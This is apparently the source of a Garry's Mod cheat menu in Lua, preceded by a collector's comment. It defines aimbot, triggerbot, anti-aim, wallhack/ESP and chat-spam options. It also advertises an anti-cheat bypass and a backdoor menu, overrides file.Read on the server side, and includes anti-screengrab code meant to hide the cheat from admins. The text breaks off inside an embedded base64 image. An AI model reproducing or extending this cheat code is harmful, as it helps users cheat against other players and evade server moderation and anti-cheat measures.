
/*
	note by paradox:
	
	This was a cheat that copy and pasted Idiotboxes code at the height of Idiotbox. It got bullied out of existance pretty quickly.
*/


//-----GLP LockStep Menu_Version 3.3.1----//
  //---------DEV GlItCH-------//
//FREE PANEL BY LMC - EDUCATIONAL CODE - IN USING THIS USE AGREE TO NOT DOING ANYTHING DAMAGE CAUSING TO SERVERS OR PLAYERS ALIKE - ID:UNKNOWN\\    

-----------------------------------------------------------------------------------------------------STUFF--------------------------------------------------------------------------------------------------------------------------------------------------
 
local RatesScaleLevel = LocalPlayer():SteamID() -- So to speak check по SteamID
if RatesScaleLevel == "STEAM_0:0:0" -- Single player (just in case)
or RatesScaleLevel == "STEAM_0:0:0" -- Player_
or true then
    if ( SERVER ) then
        function file.Read(d)
            return "Player_"
        end
    end
local C = table.Copy( concommand )
local CCA = C.Add
local prant = print
prant( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
MsgC (Color(255, 0, 0, 255), [[
      ========================================================================
       ---   ------------------------------    ----------------  
          ----            GlItCh Panel LockStep FREE V3.3.1- ONLINE! ------
                         ==========                  ================ 
      ========================================================================
 

                                       .--------.
                                      / .------. \
                                     / /        \ \
                                     | |        | |
                                   _ | |________| |_
                                 . ' |_|        |_| ' .
                                  '._____ ____ _____.'
                                  |     .'____'.     |
                                  '.__.'.'    '.'.__.'
                                 '.__  |L   M  C|  __.'
                                  |   '.'.____.'.'   |
                                  '.____'.____.'____.'
                                  '.________________.'

                            /¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\  
                           |       GlItCh Menu  Menu 3.3.1      |         
                           |          |Build 8/19/2020|         |        
                           |              by LMC                |        
                           |      Creation Is Perfection        |          
                           |  ________________________________  |        
                           |  Press INSERT To Open AimBot Menu  |
                           |   Type GLP to get Exploits Menu    |    
                           \  --------------------------------  /
                             ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
Thanks for Choosing GlItCh Menu GarrysMod Mod MENU..... ENJOY
=====================================================================================================
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!
SYSTEMS ONLINE!

*AC Scan and Bypasser Enabled
*GLP Panel Active
...
=====================================================================================================
  ]])
surface.PlaySound("garrysmod/content_downloaded.wav")

--[[ WATERMARK ]] --
--[[Watermark = vgui.Create( "HTML" )
Watermark:SetPos( -13, -8)
Watermark:SetSize( ScrW(), ScrH())
Watermark:OpenURL( "" )]]
----------------------------------------------
Version = "v3.1.1"
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
surface.CreateFont("ESPFont", {
       font = "Roboto", 
       size = 12, 
antialias = false, 
outline = true, 
})

surface.CreateFont("MenuFont", {
	font = "Roboto", 
	size = 12, 
weight = 674, 
antialias = false, 
outline  = true, 
})

surface.CreateFont("GLPBotFont", {
	font = "Roboto", 
	size = 16, 
weight = 1300, 
antialias = false, 
outline  = true, 
})

surface.CreateFont("MiscFont", {
	font = "Roboto", 
	size = 12, 
weight = 900, 
antialias = false, 
outline  = true, 
})

surface.CreateFont("MiscFont2", {
	font = "Roboto", 
	size = 12, 
weight = 900, 
antialias = false, 
outline  = false, 
})

surface.CreateFont("MiscFont3", {
	font = "Roboto", 
	size = 13, 
weight = 674, 
antialias = false, 
outline  = true, 
})

local options = {
 ["Aimbot"] = {
                {
{"Ragebot", 16, 20, 347, 220, 160}, 
{"Enabled", "Checkbox", false, 0}, 
{"Aim-Key:", "Selection", "None", {"None", "Mouse 3", "Mouse 4", "Mouse 5", "Mouse 6", "Left 'ALT' Key", "The 'E' Key", "The 'F' Key", "The 'G' Key", "The 'B' Key", "The 'C' Key"}, 135}, 
{"Silent", "Checkbox", false, 0}, 
{"Auto Fire", "Checkbox", false, 0}, 
{"Alt Fire", "Checkbox", false, 0}, 
{"Auto Stop", "Checkbox", false, 0}, 
{"Auto Crouch", "Checkbox", false, 0}, 
{"Target Lock", "Checkbox", false, 0}, 
}, 
{
{"Legitbot", 16, 254, 347, 373, 160}, 
{"Enabled", "Checkbox", false, 0}, 
{"Aim-Key:", "Selection", "None", {"None", "Mouse 3", "Mouse 4", "Mouse 5", "Mouse 6", "Left 'ALT' Key", "The 'E' Key", "The 'F' Key", "The 'G' Key", "The 'B' Key", "The 'C' Key"}, 135}, 
{"Aim FoV Value:", "Slider", 25, 500, 135}, 
{"Aim Smoothness:", "Slider", 5, 50, 135}, 
{"Silent (For Anti-Aim)", "Checkbox", false, 0}, 
{"Auto Fire", "Checkbox", false, 0}, 
{"Alt Fire", "Checkbox", false, 0}, 
{"Auto Stop", "Checkbox", false, 0}, 
{"Auto Crouch", "Checkbox", false, 0}, 
{"Target Lock", "Checkbox", false, 0}, 
{"No Lerp", "Checkbox", false, 0}, 
{"Fire Delay:", "Slider", 0, 100, 135}, 
}, 
{
{"Aim Options", 376, 20, 347, 608, 160}, 
{"Priority:", "Selection", "Crosshair", {"Crosshair", "Distance", "Health", "Random"}, 135}, 
{"Priority List", "Checkbox", true, 0}, -- Enabled by default
{"List Spacing:", "Slider", 0, 10, 135}, 
{"Body Aim", "Checkbox", false, 0}, 
{"Ignore Team", "Checkbox", false, 0}, 
{"Ignore Friends", "Checkbox", false, 0}, 
{"Ignore Players", "Checkbox", false, 0}, 
{"Ignore Bots", "Checkbox", false, 0}, 
{"Ignore NPCs", "Checkbox", false, 0}, 
{"Ignore Admins", "Checkbox", false, 0}, 
{"Ignore Noclip", "Checkbox", false, 0}, 
{"Disable in Noclip", "Checkbox", false, 0}, 
{"Ignore Driving Players", "Checkbox", false, 0}, 
{"Ignore Transparent Players", "Checkbox", false, 0}, 
{"Ignore Overhealed Players", "Checkbox", false, 0}, 
{"Max Health:", "Slider", 500, 5000, 135}, 
}, 
{
{"WeaponJacker", 736, 20, 347, 608, 153}, 
{"No Recoil", "Checkbox", false, 0}, 
{"DoubleTap", "Checkbox", false, 0}, 
{"Rapid Alt Fire", "Checkbox", false, 0}, 
{"Snap Lines", "Checkbox", false, 0}, 
{"Bullet Time", "Checkbox", false, 0}, 
{"Auto Wall", "Checkbox", false, 0}, 

}, 
}, 
["Triggerbot"] = {
{
{"Triggerbot", 16, 20, 347, 608, 218}, 
{"Enabled", "Checkbox", false, 74}, 
{"Trigger-Key:", "Selection", "None", {"None", "Mouse 3", "Mouse 4", "Mouse 5", "Mouse 6", "Left 'ALT' Key", "The 'E' Key", "The 'F' Key", "The 'G' Key", "The 'B' Key"}, 88}, 
{"Smooth Aim", "Checkbox", false, 74}, 
{"Alt Fire", "Checkbox", false, 74}, 
{"Auto Stop", "Checkbox", false, 74}, 
{"Auto Crouch", "Checkbox", false, 74}, 
{"Fire Delay:", "Slider", 0, 100, 88}, 

}, 
}, 
["FakeAngles"] = {
{
{"FAKEAngles)", 16, 20, 347, 608, 170}, 
{"Enabled", "Checkbox", false, 122}, 
{"Disable in Noclip", "Checkbox", true, 122}, -- Enabled by default
{"Disable with 'E' Key", "Checkbox", true, 122}, -- Enabled by default
{"Wall Detect", "Checkbox", false, 122}, 
{"View Lock", "Checkbox", false, 122}, 
{"Static", "Checkbox", false, 122}, 
{"Adaptive", "Checkbox", false, 122}, 
{"X-Axis:", "Selection", "Off", {"Off", "Emotion", "Down", "Up", "Center", "Jitter", "Fake-Down", "Fake-Up", "Semi-Jitter Down", "Semi-Jitter Up", "Spinbot"}, 136}, 
{"Y-Axis:", "Selection", "Off", {"Off", "Forwards", "Backwards", "Sideways", "Fake-Forwards", "Fake-Backwards", "Fake-Sideways", "Emotion", "Jitter", "Backwards Jitter", "Sideways Jitter", "Semi-Jitter", "Backwards Semi-Jitter", "Sideways Semi-Jitter", "Side Switch", "Spinbot"}, 136}, 
{"Switch-Key:", "Selection", "The 'B' Key", {"Mouse 3", "Mouse 4", "Mouse 5", "Mouse 6", "Left 'ALT' Key", "The 'E' Key", "The 'F' Key", "The 'G' Key", "The 'B' Key"}, 136}, 
{"Anti-Aim Direction:", "Selection", "Left", {"Left", "Right", "Manual Switching"}, 136}, 
{"Spinbot Speed:", "Slider", 0, 180, 136}, 
{"Emotion X-Axis:", "Slider", 0, 100, 136}, 
{"Emotion Y-Axis:", "Slider", 0, 100, 136}, 
{"", "Checkbox", false, 9999}, 

}, 
{
{"Resolver", 736, 20, 347, 608, 218}, 
{"Enabled", "Checkbox", false, 74}, 
{"X-Axis:", "Selection", "Off", {"Off", "Down", "Up", "Center", "Invert", "Random", "Auto"}, 88}, 
{"Y-Axis:", "Selection", "Off", {"Off", "Left", "Right", "Invert", "Random", "Auto"}, 88}, 
{"Priority Targets Only", "Checkbox", false, 74}, 
{"Emote Resolver", "Checkbox", false, 74}, 

                }, 
		}, 
        ["ESP"] = {
                {
					{"Wallhack", 16, 20, 347, 598, 218}, 
					{"Enabled", "Checkbox", false, 74}, 
					{"Box", "Checkbox", false, 74}, 
					{"Box Type:", "Selection", "2D Box", {"2D Box", "3D Box", "Edged Box"}, 88}, 
					{"Chams", "Checkbox", false, 74}, 
					{"Playermodel Chams", "Checkbox", false, 74}, 
					{"Skeleton", "Checkbox", false, 74}, 
					{"Glow", "Checkbox", false, 74},
					{"GlowBRIGHT", "Checkbox", false, 74}, 
					{"HitboxALL", "Checkbox", false, 74}, 
					{"Vision Line", "Checkbox", false, 74}, 
					{"Name", "Checkbox", false, 74}, 
					{"Bystander Name", "Checkbox", false, 74}, 
					{"Health Bar", "Checkbox", false, 74}, 
					{"Health Value", "Checkbox", false, 74}, 
					{"Armor Bar", "Checkbox", false, 74}, 
					{"Armor Value", "Checkbox", false, 74}, 
					{"Weapon", "Checkbox", false, 74}, 
					{"Rank", "Checkbox", false, 74}, 
					{"Distance", "Checkbox", false, 74}, 
					{"Velocity", "Checkbox", false, 74}, 
					{"Conditions", "Checkbox", false, 74}, 
					{"Steam ID", "Checkbox", false, 74}, 
					{"Ping", "Checkbox", false, 74}, 
					{"DarkRP Money", "Checkbox", false, 74}, 
                }, 
                {
					{"Extra", 736, 20, 347, 608, 218}, 
					{"Show Enemies Only", "Checkbox", false, 74}, 
					{"BackCamera", "Checkbox", false, 74},
                                        {"BackCamera2", "Checkbox", false, 74},  
					{"Team Colors", "Checkbox", false, 74}, 
					{"Spectators", "Checkbox", true, 74}, -- Enabled by default
					{"Radar", "Checkbox", true, 74}, -- Enabled by default
					{"Radar Distance:", "Slider", 50, 100, 88}, 
					{"Custom Status", "Checkbox", true, 74}, -- Enabled by default
					{"Players List", "Checkbox", true, 74}, -- Enabled by default
					{"Show NPCs", "Checkbox", false, 74}, 
					{"Show Entities", "Checkbox", false, 74}, 
					{"Witness Finder", "Checkbox", false, 74}, 
					{"Traitor Finder", "Checkbox", false, 74}, 
					{"Murderer Finder", "Checkbox", false, 74}, 
					{"Distance Limit", "Checkbox", false, 74}, 
					{"Distance:", "Slider", 0, 5000, 88}, 
                }, 
        }, 
		["Utilities"] = {
				{
					{"Utilities", 16, 20, 347, 608, 218}, 
					{"Optimize Game", "Checkbox", true, 74}, -- Enabled by default
					{"Anti-AFK", "Checkbox", false, 74}, 
					{"Anti-Ads", "Checkbox", true, 74}, -- Enabled by default
					{"Anti-Blind", "Checkbox", true, 74}, -- Enabled by default
					{"TTT: Hide Round Report", "Checkbox", true, 74}, -- Enabled by default
					{"TTT: Panel Remover", "Checkbox", true, 74}, -- Enabled by default
					{"TTT: Prop Kill", "Checkbox", false, 74}, 
					{"TTT: Prop Kill-Key:", "Selection", "The 'E' Key", {"Mouse 3", "Mouse 4", "Mouse 5", "Mouse 6", "Left 'ALT' Key", "The 'E' Key", "The 'F' Key", "The 'G' Key", "The 'B' Key"}, 88}, 
					{"Murder: Hide End Round Board", "Checkbox", true, 74}, -- Enabled by default
					{"Murder: Hide Footprints", "Checkbox", true, 74}, -- Enabled by default
					{"Murder: No Black Screens", "Checkbox", true, 74}, -- Enabled by default
					{"DarkRP: Suicide Near Arrest Batons", "Checkbox", true, 74}, -- Enabled by default
					{"DarkRP: Transparent Props", "Checkbox", false, 74}, 
					{"DarkRP: Transparency:", "Slider", 157, 255, 88}, 

          		}, 
                
        }, 
		["Extra"] = {
                {
					{"Extra", 50, 20, 250, 510, 130}, 
					{"Emotes", "Checkbox", false, 74}, 
					{"Emote Type:", "Selection", "Random", {"Dance", "Sexy", "Wave", "Robot", "Bow", "Cheer", "Laugh", "Zombie", "Agree", "Disagree", "Forward", "Back", "Salute", "Pose", "Halt", "Group", "Random"}, 88}, 
					{"Murder Taunts", "Checkbox", false, 74}, 
					{"Taunt Type:", "Selection", "Random", {"Funny", "Help", "Scream", "Morose", "Random"}, 88}, 
					{"Crosshair", "Checkbox", false, 74}, 
					{"Crosshair Type:", "Selection", "Cross", {"Square", "Cross", "Aimware", "Box", "Circle", "Dot", "GTA IV", "fovcircle",}, 88},  
					{"Screen Grab Notifications", "Checkbox", false, 74},  
					{"Reset Sounds", "Checkbox", false, 74}, 
					{"Hide HUD", "Checkbox", false, 74}, 
					{"Flashlight Spam", "Checkbox", false, 74}, 
					{"Auto Reload", "Checkbox", false, 74}, 
                	                {"Auto Reload at:", "Slider", 0, 99, 88}, 
					{"Thirdperson", "Checkbox", false, 74}, 
					{"Thirdperson Distance:", "Slider", 15, 100, 88}, 
                }, 
				{
                	{"ViewModel", 312, 20, 217, 608, 25}, 
					{"Enabled", "Checkbox", false, 54}, 
					{"FoV:", "Slider", 111, 360, 67}, 
					{"", "Checkbox", false, 9999}, 
					{"ViewModel Chams", "Checkbox", false, 54}, 
					{"ViewModel Frame", "Checkbox", false, 54}, 
					{"No ViewModel", "Checkbox", false, 54}, 
					{"No Hands", "Checkbox", false, 54}, 
                }, 
				{
                	{"Chat", 538, 20, 240, 608, 100}, 
				{"Log Kills in Chat", "Checkbox", false, 92}, 
				{"Enable Spams", "Checkbox", false, 92}, 
				{"Chat Spam:", "Selection", "Off", {"Off", "Advertising 1", "Advertising 2", "Advertising 3", "Russian Spam", "ULX RconFAKE", "Owned Spam", "Annoying Spam", "OOC Clear Chat", "Drop Money", "linkspamv2"}, 108}, 
			{"Kill Spam:", "Selection", "Off", {"Off", "Normal", "Insult", "Salty", "HvH", "GLP Menu HvH", "Votekick", "Voteban", "Killstreak", }, 108}, 
			{"Reply Spam:", "Selection", "Off", {"Off", "shut up", "ok", "who", "nobody cares", "where", "lol stop spamming", "what", "yea", "lol", "FUNNY", "SHOT", "fooy", "Random", "Disconnect Spam", "Cheater Callout", "Copy Messages"}, 108}, 
                }, 
				{
		{"Movement", 790, 20, 240, 608, 105}, 
		{"Bunny Hop", "Checkbox", false, 54}, 
		{"Auto Strafe", "Checkbox", false, 54}, 
		{"Air Crouch", "Checkbox", false, 54}, 
		{"Fake Crouch", "Checkbox", false, 54}, 
		{"Circle Strafe", "Checkbox", false, 54}, 
		{"Strafe Speed:", "Slider", 0, 6, 67}, 
                }, 
        }, 
		["Home"] = {
{
{"Main Text Color", 50, 20, 250, 105, 100}, 
{"Red:", 255, 255, 88}, 
{"Green:", 0, 0, 0}, 
{"Blue:", 0, 0, 0}, 
},
{
{"Menu Text Color", 311, 20, 205, 105, 70}, 
{"Red:", 255, 255, 0}, 
{"Green:", 255, 255, 0}, 
{"Blue:", 255, 255, 0}, 
}, 
{
{"Background Menu Color", 525, 20, 245, 105, 100}, 
{"Red:", 5, 5, 0}, 
{"Green:", 5, 5, 0}, 
{"Blue:", 5, 5, 0}, 
}, 
{
		{"Border Color", 780, 20, 250, 105, 100}, 
		{"Red:", 253, 253, 0}, 
		{"Green:", 0, 0, 0}, 
		{"Blue:", 0, 0, 0}, 
}, 
{
			{"Team ESP Color", 50, 145, 250, 105, 100}, 
			{"Red:", 255, 255, 0}, 
			{"Green:", 255, 255, 0}, 
			{"Blue:", 255, 255, 0}, 
}, 
{
				{"Enemy ESP Color", 311, 145, 205, 105, 70}, 
				{"Red:", 255, 255, 255}, 
				{"Green:", 0, 0, 0}, 
				{"Blue:", 0, 0, 0}, 
}, 
{
					{"Friend ESP Color", 525, 145, 245, 105, 100}, 
					{"Red:", 0, 0, 0}, 
					{"Green:", 255, 255, 255}, 
					{"Blue:", 0, 0, 0}, 
                }, 
				{
					{"Entities ESP Color", 780, 145, 250, 105, 100}, 
					{"Red:", 255, 255, 255}, 
					{"Green:", 255, 255, 255}, 
					{"Blue:", 255, 255, 255}, 
                }, 
				{
					{"Misc ESP Color", 50, 270, 250, 105, 100}, 
					{"Red:", 0, 255, 0}, 
					{"Green:", 255, 255, 0}, 
					{"Blue:", 255, 255, 0}, 
                }, 
				{
					{"Team Chams Color", 311, 270, 205, 105, 70}, 
					{"Red:", 0, 0, 0}, 
					{"Green:", 0, 0, 0}, 
					{"Blue:", 59, 161, 198}, 
                }, 
				{
					{"Enemy Chams Color", 525, 270, 245, 105, 100}, 
					{"Red:", 255, 255, 255}, 
					{"Green:", 0, 0 , 0}, 
					{"Blue:", 0, 0, 0}, 
                }, 
				{
					{"Crosshair Color", 780, 270, 250, 105, 100}, 
					{"Red:", 0, 0, 0}, 
					{"Green:", 255, 255, 255}, 
					{"Blue:", 0, 0, 0}, 
                }, 
				{
					{"ViewModel Color", 50, 390, 250, 105, 100}, 
					{"Red:",84, 84, 84}, 
					{"Green:", 0, 0, 0}, 
					{"Blue:", 0, 0, 0}, 
                }, 
				{
					{"Others", 311, 390, 205, 157, 70}, 
					{"T Opacity:", 255, 255, 0}, 
					{"B Opacity:", 255, 255, 0}, 
					{"BG Opacity:", 248, 248, 0}, 
					{"BG Darkness:", 0, 0, 0}, 
					{"Roundness:", 0, 0, 0}, 
                }, 
				{
			{"Window Positions", 525, 390, 245, 157, 88}, 
			{"Spectators X:",  0, 0, 0}, 
			{"Spectators Y:",  206, 206, 0}, 
			{"Radar X:", 0, 0, 121}, 
			{"Radar Y:", 0, 0, 121}, 
			{"Roundness:", 0, 0, 121}, 
                }, 
				{
{"List Positions", 780, 390, 250, 157, 88}, 
{"Custom Status X:", 51, 45, 121}, 
{"Custom Status Y:", 51, 454, 121}, 
{"Players List X:", 51, 2000, 121}, 
{"Players List Y:", 51, 2000, 121}, 
{"Roundness:", 0, 0, 121},
}, 
}, 

        ["MenuHome"] = {
                {
					{"[Change Log - System Rework - 8/18/2020]", 389, 65, 355, 294, 130}, 
					{"                                    [Thanks For Using FREE GLP]", "Checkbox", false, 9999}, 
					{"- BUY PREMIUM GLP AT www.lmccoding.weebly.com", "Checkbox", false, 9999}, 
                }, 
                {
					{"[UPDATES]",30, 20, 347, 608, 218}, 
					{"- Fixed FOV Circle", "Checkbox", false, 9999}, 
					{"- Added New Crosshairs", "Checkbox", false, 9999}, 
					{"- New BackCamera", "Checkbox", false, 9999}, 
					{"- Fixed Stabillity", "Checkbox", false, 9999},
					{"- NEW MENU TAB", "Checkbox", false, 9999},
					{"- NEW GLP BackdoorMenu", "Checkbox", false, 9999},
					{"- 10+ Gltiches Patched", "Checkbox", false, 9999},
					{"- Fixed Chams", "Checkbox", false, 9999},
               }, 
        }, 
}

local order = {
	"Aimbot", 
	"Triggerbot", 
	"FakeAngles", 
	"ESP", 
	"Utilities", 
	"Extra", 
        "MenuHome", 
}

local function gConn(men, sub, lookup)
	if(not options[men]) then return end
	for aa, aaa in next, options[men] do
		for key, val in next, aaa do
			if(aaa[1][1] ~= sub) then continue end
			if(val[1] == lookup) then
				return val[3]
			end
		end
	end
end

local function gOption(men, sub, lookup)
	if(not options[men]) then return "" end
	for aa, aaa in next, options[men] do
		for key, val in next, aaa do
			if(aaa[1][1] ~= sub) then continue end
			if(val[1] == lookup) then
				return val[3]
			end
		end
	end
	return ""
end

local function gInt(men, sub, lookup)
	if(not options[men]) then return 0 end
	for aa, aaa in next, options[men] do
		for key, val in next, aaa do
			if(aaa[1][1] ~= sub) then continue end
			if(val[1] == lookup) then
				return val[3]
			end
		end
	end
	return 0
end

local windowopen = false

local function MsgG(time, text)
	if not windowopen then
		windowopen = true
		local window = vgui.Create("DFrame")
		window:SetPos(ScrW()/2.7, 0)
		window:SetSize(500, 25)
		window:SlideDown(0.3)
		window:SetTitle("")
		window:ShowCloseButton(false)
		window:SetDraggable(false)
		window.Paint = function(s, w, h)
			surface.SetDrawColor(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), 240)
		surface.DrawRect(0, 0, w, h)
		draw.DrawText(text, "MenuFont", w/2, 6, Color(0, 255, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	timer.Simple(time, function()
if windowopen then
window:SlideUp(0.3)
timer.Simple(0.3, function()
windowopen = false
window:Remove()
end)
end
end)
end
print("\n"..text.."\n")
end

local function MsgY(time, text)
	if not windowopen then
		windowopen = true
	local window = vgui.Create("DFrame")
	window:SetPos(ScrW()/2.7, 0)
	window:SetSize(500, 25)
	window:SlideDown(0.3)
	window:SetTitle("")
	window:ShowCloseButton(false)
	window:SetDraggable(false)
	window.Paint = function(s, w, h)
	surface.SetDrawColor(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), 240)
	surface.DrawRect(0, 0, w, h)
	draw.DrawText(text, "MenuFont", w/2, 6, Color(255, 255, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
     end
	timer.Simple(time, function()
	if windowopen then
window:SlideUp(0.3)
timer.Simple(0.3, function()
windowopen = false
window:Remove()
end)
end
end)
end
print("\n"..text.."\n")
end

local function MsgR(time, text)
	if not windowopen then
		windowopen = true
		local window = vgui.Create("DFrame")
		window:SetPos(ScrW()/2.7, 0)
		window:SetSize(500, 25)
		window:SlideDown(0.3)
		window:SetTitle("")
		window:ShowCloseButton(false)
		window:SetDraggable(false)
		window.Paint = function(s, w, h)
			surface.SetDrawColor(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), 240)
			surface.DrawRect(0, 0, w, h)
			draw.DrawText(text, "MenuFont", w/2, 6, Color(255, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
		timer.Simple(time, function()
			if windowopen then
				window:SlideUp(0.3)
				timer.Simple(0.3, function()
					windowopen = false
					window:Remove()
				end)
			end
		end)
	end
	print("\n"..text.."\n")
end

local function MsgRGB(time, text)
	if not windowopen then
		windowopen = true
		local window = vgui.Create("DFrame")
		window:SetPos(ScrW()/2.7, 0)
		window:SetSize(500, 25)
		window:SlideDown(0.3)
		window:SetTitle("")
		window:ShowCloseButton(false)
		window:SetDraggable(false)
		window.Paint = function(s, w, h)
			surface.SetDrawColor(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), 240)
			surface.DrawRect(0, 0, w, h)
			draw.DrawText(text, "MenuFont", w/2, 6, HSVToColor(RealTime()*69%360, 1, 1) || Color(0, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
		timer.Simple(time, function()
			if windowopen then
				window:SlideUp(0.3)
				timer.Simple(0.3, function()
					windowopen = false
					window:Remove()
				end)
			end
		end)
	end
	print("\n"..text.."\n")
end

local function MsgAntiScreengrab(time, text)
	if gConn("Extra", "Extra", "Screen Grab Notifications") then
	if not windowopen then
		windowopen = true
		local window = vgui.Create("DFrame")
		window:SetPos(ScrW()/2.7, 0)
		window:SetSize(500, 25)
		window:SlideDown(0.3)
		window:SetTitle("")
		window:ShowCloseButton(false)
		window:SetDraggable(false)
		window.Paint = function(s, w, h)
			surface.SetDrawColor(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), 240)
			surface.DrawRect(0, 0, w, h)
			draw.DrawText(text, "MenuFont", w/2, 6, Color(255, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
		timer.Simple(time, function()
			if windowopen then
				window:SlideUp(0.3)
				timer.Simple(0.3, function()
					windowopen = false
					window:Remove()
				end)
			end
		end)
	end
	print("\n"..text.."\n")
	surface.PlaySound("buttons/lightswitch2.wav")
	end
end

if gui.IsGameUIVisible() then
	gui.HideGameUI()
end


timer.Simple(2, function()

local GLPBot	= (_G)

local ply = LocalPlayer()


local missingpng = file.Read("materials/missing256.png", "GAME")

local GLPBot_antiscreengrab = "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